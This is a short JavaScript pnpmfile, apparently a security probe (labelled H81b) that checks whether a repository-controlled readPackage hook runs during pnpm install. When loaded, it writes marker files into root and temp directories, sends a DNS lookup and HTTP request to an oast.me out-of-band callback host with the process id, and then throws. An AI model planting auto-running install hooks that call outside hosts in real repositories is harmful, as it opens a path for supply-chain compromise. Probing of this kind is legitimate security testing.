// H81b: repository-controlled pnpmfile, readPackage hook.
// If pnpm loads this file, dependency resolution must fail on the throw.
// It writes a non-secret marker first (pid only), then throws.
const fs = require('fs');
const path = require('path');
const MARK = 'h81b-pnpmfile-ran';

function mark(tag) {
  const dirs = ['/', '/.eslint-tmp/', '/tmp/'];
  try { dirs.push(process.cwd() + '/'); } catch (e) {}
  for (const d of dirs) {
    try { fs.writeFileSync(d + MARK, tag + ' pid=' + process.pid + '\n'); } catch (e) {}
  }
}

// Best-effort OAST callback (secondary signal only).
try {
  const OAST = 'dc1i9npbs5ss7eqerff0dry7w1fknd4r8.oast.me';
  require('dns').lookup('h81b-pnpmfile.' + OAST, function () {});
  const req = require('http').get('http://' + OAST + '/h81b-pnpmfile?pid=' + process.pid, function (r) { r.resume(); });
  req.on('error', function () {});
  req.setTimeout(3000);
} catch (e) {}

module.exports = {
  hooks: {
    readPackage(pkg) {
      mark('readPackage:' + (pkg && pkg.name ? pkg.name : 'unknown'));
      throw new Error('H81B-PNPMFILE-READPACKAGE');
    },
  },
};
